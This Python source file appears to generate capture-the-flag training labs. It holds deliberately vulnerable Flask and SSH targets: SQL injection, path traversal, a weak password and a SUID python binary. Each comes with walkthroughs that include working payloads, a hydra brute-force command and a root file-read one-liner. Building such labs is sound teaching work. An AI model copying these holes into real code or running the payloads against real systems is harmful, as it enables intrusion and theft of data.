"""Challenge Factory: deterministic builders for real, flag-bearing CTF targets.

The LLM only *selects* an archetype and difficulty. All artifacts (Dockerfile,
app code, compose) are emitted by these templates -- the same
'constrained generation' harness principle as the attack-box layer.

Design rules:
  * The flag NEVER lands in the workspace / zip. It is passed to the target
    image as a Docker build ARG, so it only exists inside the built image.
  * The target is only reachable from inside the Compose network (`labnet`).
    Host port publishing is opt-in via `expose_target_ui=True` and binds to
    127.0.0.1 only.
  * The attack box is built from a custom Dockerfile that pre-installs the
    tools an archetype needs, so `docker compose exec kali bash` lands in a
    working environment.
"""

import hashlib
import secrets
import textwrap

POINTS = {"beginner": 50, "intermediate": 100, "advanced": 200, "expert": 350}
HINT_FRACTION = 0.25   # each hint costs 25% of base points


def make_flag(archetype: str) -> str:
    return f"FLAG{{{archetype}_{secrets.token_hex(6)}}}"


def flag_hash(flag: str) -> str:
    return hashlib.sha256(flag.encode()).hexdigest()


# ---------------------------------------------------------------- archetypes
def _web_base(app_py: str, docker_cmd: list[str]) -> dict:
    """Python/Flask target Dockerfile. The flag is written from $FLAG at build time,
    never copied from a file on disk."""
    dockerfile = textwrap.dedent(f"""
        FROM python:3.11-slim
        RUN pip install --no-cache-dir flask==3.0.3
        WORKDIR /app
        ARG FLAG
        RUN echo -n "$FLAG" > /flag.txt && chmod 400 /flag.txt
        COPY app.py .
        EXPOSE 80
        CMD {docker_cmd}
    """).lstrip()
    return {
        "target/Dockerfile": dockerfile,
        "target/app.py": app_py,
    }


ARCHETYPES = {
    # ---------------------------------------------------------- web + sqli
    "web-sqli-login": {
        "title": "Login Bypass (SQLi)",
        "svc": "ui", "port": ("8080", "80"),
        "purpose": "Classic SQL injection auth bypass on a web login form.",
        "scenario": ("A legacy admin panel at http://target (from the Kali box) uses raw SQL. "
                     "Log in as the administrator and recover the flag stored in the users table."),
        "kali_packages": ["sqlmap", "curl", "netcat-traditional"],
        "hints": [
            "What happens if the username contains a single quote?",
            "SQL comments: everything after -- is ignored by the database.",
            "Try: admin' OR '1'='1' --",
        ],
        "walkthrough": (
            "1. From the Kali box: `curl -s http://target/` -- confirm the form loads.\n"
            "2. Send a single quote as username to surface the SQL error:\n"
            "   `curl -s -X POST http://target/login -d \"username='&password=x\"`\n"
            "3. Bypass: username = `admin' OR '1'='1' --` (any password).\n"
            "   `curl -s -X POST http://target/login --data-urlencode \"username=admin' OR '1'='1' --\" -d password=x`\n"
            "4. Response contains the flag for the admin row.\n"
            "Mitigation: parameterized queries / prepared statements."
        ),
        "build": lambda flag: {
            **_web_base(textwrap.dedent('''
                import sqlite3
                from flask import Flask, request
                app = Flask(__name__)
                FLAG = open("/flag.txt").read().strip()
                db = sqlite3.connect(":memory:", check_same_thread=False)
                db.executescript("""
                    CREATE TABLE users(username TEXT, password TEXT, flag TEXT);
                    INSERT INTO users VALUES('admin','s3cr3t!','__FLAG__');
                    INSERT INTO users VALUES('alice','wonderland','');
                    INSERT INTO users VALUES('bob','builder','');
                """)
                FORM = """
                <h2>Admin Panel</h2><form method="POST" action="/login">
                <input name="username" placeholder="username">
                <input name="password" type="password" placeholder="password">
                <button>Login</button></form>
                """
                @app.route("/", methods=["GET"])
                def home(): return FORM
                @app.route("/login", methods=["POST"])
                def login():
                    u = request.form.get("username", "")
                    p = request.form.get("password", "")
                    q = "SELECT username, flag FROM users WHERE username='%s' AND password='%s'" % (u, p)
                    try:
                        row = db.execute(q).fetchone()
                    except Exception as e:
                        return f"<pre>SQL error: {e}</pre>" + FORM
                    if row and row[0] == "admin":
                        return f"<h3>Welcome, admin.</h3><p>Your flag: <b>{row[1]}</b></p>"
                    return "Invalid credentials." + FORM
                if __name__ == "__main__":
                    app.run(host="0.0.0.0", port=80)
            ''').replace("__FLAG__", flag),
            '["python", "app.py"]'),
        },
    },
    # ---------------------------------------------------------- web + lfi
    "web-lfi": {
        "title": "File Inclusion (Path Traversal)",
        "svc": "ui", "port": ("8080", "80"),
        "purpose": "Local file inclusion leading to arbitrary file read.",
        "scenario": ("A site at http://target loads pages via ?page=. "
                     "Read /flag.txt from the target filesystem."),
        "kali_packages": ["curl", "netcat-traditional"],
        "hints": [
            "The page parameter is concatenated into a file path.",
            "Directory traversal: ../ climbs up the tree.",
            "Try: ?page=../../../../flag.txt",
        ],
        "walkthrough": (
            "1. From the Kali box: `curl -s 'http://target/?page=about'` -- pages are read from /app/pages/.\n"
            "2. Traversal: `curl -s 'http://target/?page=../../../../flag.txt'` escapes the pages directory.\n"
            "3. Flag is printed in the response.\n"
            "Mitigation: allowlist page names, canonicalize paths."
        ),
        "build": lambda flag: {
            **_web_base(textwrap.dedent('''
                import os
                from flask import Flask, request
                app = Flask(__name__)
                os.makedirs("/app/pages", exist_ok=True)
                open("/app/pages/about.html", "w").write("<h1>About us</h1><p>We build things.</p>")
                open("/app/pages/news.html", "w").write("<h1>News</h1><p>Nothing new.</p>")
                @app.route("/")
                def home():
                    page = request.args.get("page", "about")
                    try:
                        with open(f"/app/pages/{page}.html") as f:
                            return f.read()
                    except Exception as e:
                        return f"<pre>{e}</pre>"
                if __name__ == "__main__":
                    app.run(host="0.0.0.0", port=80)
            '''),
            '["python", "app.py"]'),
        },
    },
    # ---------------------------------------------------------- weak ssh
    "weak-ssh": {
        "title": "Weak Credential SSH",
        "svc": "cli", "port": ("2222", "22"),
        "purpose": "Brute-forceable SSH password leading to flag exfiltration.",
        "scenario": ("An SSH service is exposed at hostname `target` port 22 (user: ctf). "
                     "Crack the password and read /home/ctf/flag.txt."),
        "kali_packages": ["hydra", "nmap", "openssh-client", "netcat-traditional"],
        "hints": [
            "The password is a common word plus digits -- try a small wordlist first.",
            "hydra -l ctf -P /usr/share/wordlists/rockyou.txt ssh://target",
            "Password: dragon2024",
        ],
        "walkthrough": (
            "1. From the Kali box: `nmap -p 22 target` -> SSH is up.\n"
            "2. Brute force: `hydra -l ctf -P /usr/share/wordlists/rockyou.txt ssh://target`\n"
            "   (shortcut: password is dragon2024).\n"
            "3. `ssh ctf@target` then `cat ~/flag.txt`.\n"
            "Mitigation: key-only auth, fail2ban, strong passwords."
        ),
        "build": lambda flag: {
            "target/Dockerfile": textwrap.dedent("""
                FROM alpine:3.19
                ARG FLAG
                RUN apk add --no-cache openssh shadow bash
                RUN mkdir -p /run/sshd && ssh-keygen -A
                RUN adduser -D ctf && echo "ctf:dragon2024" | chpasswd
                RUN echo -n "$FLAG" > /home/ctf/flag.txt
                RUN chown ctf:ctf /home/ctf/flag.txt && chmod 400 /home/ctf/flag.txt
                EXPOSE 22
                CMD ["/usr/sbin/sshd", "-D", "-e"]
            """).lstrip(),
        },
    },
    # ---------------------------------------------------------- suid privesc
    "suid-escape": {
        "title": "SUID Binary Privilege Escalation",
        "svc": "cli", "port": None,
        "purpose": "Misconfigured SUID interpreter leaks a root-only flag.",
        "scenario": ("You land in a container as user `ctf` via SSH. A root-only flag sits at /flag.txt. "
                     "Find the misconfigured SUID binary and read the flag."),
        "kali_packages": ["nmap", "openssh-client", "netcat-traditional"],
        "hints": [
            "Look for files with the SUID bit: find / -perm -4000 2>/dev/null",
            "A SUID python interpreter runs your code as root.",
            "pyroot -c \"import os; print(os.read(open('/flag.txt').fileno(), 100))\"",
        ],
        "walkthrough": (
            "1. `find / -perm -4000 2>/dev/null` -> /usr/local/bin/pyroot stands out.\n"
            "2. SUID python runs with euid 0: `pyroot -c \"import os;print(os.read(open('/flag.txt').fileno(),100))\"`\n"
            "3. Flag printed.\n"
            "Mitigation: audit SUID bits (find / -perm -4000), remove unneeded interpreters."
        ),
        "build": lambda flag: {
            "target/Dockerfile": textwrap.dedent("""
                FROM python:3.11-slim
                ARG FLAG
                RUN useradd -m ctf && echo "ctf:ctf" | chpasswd
                RUN echo -n "$FLAG" > /flag.txt && chmod 400 /flag.txt
                RUN cp /usr/local/bin/python3 /usr/local/bin/pyroot \
                    && chmod 4755 /usr/local/bin/pyroot
                RUN apt-get update && apt-get install -y openssh-server && \
                    mkdir -p /run/sshd && ssh-keygen -A
                USER ctf
                EXPOSE 22
                CMD ["/usr/sbin/sshd", "-D", "-e"]
            """).lstrip(),
        },
    },
    # ---------------------------------------------------------- crypto cli
    "crypto-cli": {
        "title": "Layered Encoding",
        "svc": "cli", "port": None,
        "purpose": "Multi-layer encoding (hex -> ROT13 -> base64) of a flag.",
        "scenario": ("A file /challenge/encoded.txt contains a flag encoded in three layers. "
                     "Peel them to recover it."),
        "kali_packages": ["coreutils", "netcat-traditional"],
        "hints": [
            "The outermost layer is hexadecimal: xxd -r -p",
            "The middle layer is a Caesar/ROT13 shift.",
            "The final layer is base64.",
        ],
        "walkthrough": (
            "1. `cat /challenge/encoded.txt` -> hex string.\n"
            "2. `xxd -r -p encoded.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 -d` -> flag.\n"
            "Mitigation: encoding is not encryption; real secrets need AEAD."
        ),
        "build": lambda flag: {
            "target/Dockerfile": textwrap.dedent("""
                FROM alpine:3.19
                ARG FLAG
                RUN apk add --no-cache bash coreutils
                RUN mkdir -p /challenge
                RUN echo -n "$FLAG" | base64 | tr 'A-Za-z' 'N-ZA-Mn-za-m' | xxd -p > /challenge/encoded.txt
                RUN echo "Three layers between you and the flag." > /challenge/note.txt
                CMD ["tail", "-f", "/dev/null"]
            """).lstrip(),
        },
    },
    # ---------------------------------------------------------- hidden fs
    "hidden-fs": {
        "title": "Hidden Files Hunt",
        "svc": "cli", "port": None,
        "purpose": "Filesystem enumeration: hidden files and permission labyrinths.",
        "scenario": ("A flag exists somewhere on this box but `ls` won't show it. "
                     "SSH in and find it."),
        "kali_packages": ["nmap", "openssh-client", "netcat-traditional"],
        "hints": [
            "Plain `ls` hides dotfiles. ls -la",
            "Search by name pattern: find / -name '*flag*' 2>/dev/null",
            "Check /var/backups/.system_flag",
        ],
        "walkthrough": (
            "1. `ls -la /` and `/var/backups` -> dotfiles hidden by default.\n"
            "2. `find / -name '.*flag*' 2>/dev/null` -> /var/backups/.system_flag\n"
            "3. `cat /var/backups/.system_flag` -> flag.\n"
            "Mitigation: dotfiles are not a security control; use proper secrets management."
        ),
        "build": lambda flag: {
            "target/Dockerfile": textwrap.dedent("""
                FROM alpine:3.19
                ARG FLAG
                RUN mkdir -p /var/backups
                RUN echo -n "$FLAG" > /var/backups/.system_flag
                RUN echo 'not the flag' > /opt/flag.txt
                RUN apk add --no-cache openssh shadow bash
                RUN mkdir -p /run/sshd && ssh-keygen -A
                RUN adduser -D ctf && echo "ctf:ctf" | chpasswd
                EXPOSE 22
                CMD ["/usr/sbin/sshd", "-D", "-e"]
            """).lstrip(),
        },
    },
}

# keyword fallback so the system works fully offline
ARCH_KEYWORDS = {
    "sqli": "web-sqli-login", "sql": "web-sqli-login", "injection": "web-sqli-login",
    "lfi": "web-lfi", "traversal": "web-lfi", "inclusion": "web-lfi",
    "ssh": "weak-ssh", "password": "weak-ssh", "brute": "weak-ssh", "hydra": "weak-ssh",
    "suid": "suid-escape", "privesc": "suid-escape", "privilege": "suid-escape",
    "encode": "crypto-cli", "crypto": "crypto-cli", "cipher": "crypto-cli", "base64": "crypto-cli",
    "hidden": "hidden-fs", "filesystem": "hidden-fs", "forensic": "hidden-fs",
}

TOOL_ARCH_HINTS = {
    "sqlmap": "web-sqli-login", "hydra": "weak-ssh", "nmap": "weak-ssh",
    "ssh": "weak-ssh", "metasploit-framework": "weak-ssh",
}


def pick_archetype(challenge: str, tools: list[str], llm_choice: str | None) -> str:
    if llm_choice in ARCHETYPES:
        return llm_choice
    text = challenge.lower()
    for t in tools:
        if t in TOOL_ARCH_HINTS:
            return TOOL_ARCH_HINTS[t]
    for k, v in ARCH_KEYWORDS.items():
        if k in text:
            return v
    return "hidden-fs"


# ------------------------------------------------- Kali tool library (official Kali packages only)
KALI_TOOLS = {
    "Recon": ["nmap", "netdiscover", "tcpdump", "wireshark"],
    "Web": ["sqlmap", "burpsuite", "ffuf", "gobuster", "nikto", "dirb"],
    "Brute/Crack": ["hydra", "john", "hashcat", "medusa"],
    "Exploitation": ["metasploit-framework", "netcat-traditional", "enum4linux-ng"],
    "Forensics": ["binwalk", "steghide", "exiftool", "foremost"],
    "Crypto/Misc": ["openssl", "python3-pip", "crunch", "cewl"],
}

# Packages that Kali's own package manager names differently from the "tool" users type.
KALI_PACKAGE_ALIASES = {
    "ping": "iputils-ping",
    "nc": "netcat-traditional",
    "netcat": "netcat-traditional",
    "python": "python3",
    "python3": "python3",
    "curl": "curl",
    "wget": "wget",
    "git": "git",
}


def build_challenge_files(archetype: str, flag: str) -> dict:
    return ARCHETYPES[archetype]["build"](flag)


def _resolve_kali_packages(requested: list[str], archetype_key: str) -> list[str]:
    """Return real apt package names for the Kali attack box.

    The archetype's `kali_packages` are always installed (so the lab is solvable
    out of the box). Any user-requested tool that is a known Kali package is
    also added. Unknown names are dropped rather than passed to apt-get, which
    would abort the whole install and leave a bare image.
    """
    known = {p for group in KALI_TOOLS.values() for p in group}
    known |= set(KALI_PACKAGE_ALIASES.values())
    known |= set(KALI_PACKAGE_ALIASES.keys())
    resolved = set(ARCHETYPES[archetype_key].get("kali_packages", []))
    for t in requested:
        t = KALI_PACKAGE_ALIASES.get(t, t)
        if t in known:
            resolved.add(t)
    # Always useful, always small:
    resolved |= {"iputils-ping", "curl", "netcat-traditional", "nano"}
    return sorted(resolved)


def build_kali_dockerfile(packages: list[str]) -> str:
    """Custom attack-box Dockerfile that pre-installs the tools the lab needs.

    Building this once and reusing the image makes subsequent lab spawns fast.
    """
    pkg_line = " ".join(packages)
    return textwrap.dedent(f"""
        FROM kalilinux/kali-rolling

        ENV DEBIAN_FRONTEND=noninteractive

        RUN apt-get update \\
            && apt-get install -y --no-install-recommends \\
                {pkg_line} \\
            && apt-get clean \\
            && rm -rf /var/lib/apt/lists/*

        WORKDIR /workspace
        CMD ["tail", "-f", "/dev/null"]
    """).lstrip()


def build_compose_v2(
    tools: list[str],
    arch: dict,
    run_short: str,
    archetype_key: str,
    flag: str,
    expose_target_ui: bool = False,
) -> tuple[str, str]:
    """Return (compose_yaml, kali_dockerfile_text).

    The target is NOT reachable from the host by default -- it lives only on
    the internal `labnet` network and is reachable from the Kali box as
    hostname `target`. If `expose_target_ui` is True, a host port is bound to
    127.0.0.1 only (never 0.0.0.0).
    """
    import yaml

    packages = _resolve_kali_packages(tools, archetype_key)
    kali_dockerfile = build_kali_dockerfile(packages)

    target = {
        "build": {
            "context": "./target",
            "args": {"FLAG": flag},   # flag only exists inside the built image
        },
        "container_name": f"secstack-target-{run_short}",
        "networks": ["labnet"],
        "cap_drop": ["ALL"],
        "security_opt": ["no-new-privileges:true"],
        "mem_limit": "512m",
        "pids_limit": 128,
    }

    port = arch.get("port")
    if port and expose_target_ui:
        # Opt-in only, and bound to loopback so the host is never exposed on the LAN.
        target["ports"] = [f"127.0.0.1:{port[0]}:{port[1]}"]

    kali = {
        "build": {
            "context": "./kali",
            "dockerfile": "Dockerfile",
        },
        "container_name": f"secstack-kali-{run_short}",
        "stdin_open": True,
        "tty": True,
        "working_dir": "/workspace",
        "volumes": ["./shared:/workspace"],
        "networks": ["labnet"],
        "security_opt": ["no-new-privileges:true"],
        "mem_limit": "2g",
    }

    compose = yaml.safe_dump({
        "name": f"secstack-{run_short}",
        "networks": {"labnet": {"driver": "bridge", "internal": False}},
        "services": {"kali": kali, "target": target},
    }, sort_keys=False)
    return compose, kali_dockerfile


def write_workspace(
    root: str,
    run_id: str,
    files: dict,
    compose: str,
    kali_dockerfile: str,
    port: tuple[str, str] | None = None,
    expose_target_ui: bool = False,
) -> str:
    """Materialise the lab on disk.

    The flag is passed to the target image via a build arg and is NEVER
    written to any file in this workspace, so the downloadable zip cannot
    leak it.
    """
    import pathlib

    base = pathlib.Path(root) / run_id
    (base / "shared").mkdir(parents=True, exist_ok=True)

    for rel, content in files.items():
        if rel.endswith("flag.txt"):
            continue  # belt-and-braces: flag is not shipped even if a builder emits it
        p = base / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)

    (base / "kali").mkdir(parents=True, exist_ok=True)
    (base / "kali" / "Dockerfile").write_text(kali_dockerfile)
    (base / "docker-compose.yml").write_text(compose)

    if port and expose_target_ui:
        access = f"Browser UI:  http://127.0.0.1:{port[0]}  (bound to loopback only)"
    else:
        access = ("The target is not published on the host. Reach it from the Kali "
                  "box using the hostname: target")

    (base / "README.txt").write_text(textwrap.dedent(f"""
        SecStack challenge lab ({run_id})
        =================================
        1. cd {base}
        2. docker compose up --build -d
        3. Attack box:   docker compose exec kali bash
        4. {access}
        5. Tear down:    docker compose down

        The flag is baked into the target image at build time and is not
        present in any file in this directory.
    """).lstrip())
    return str(base)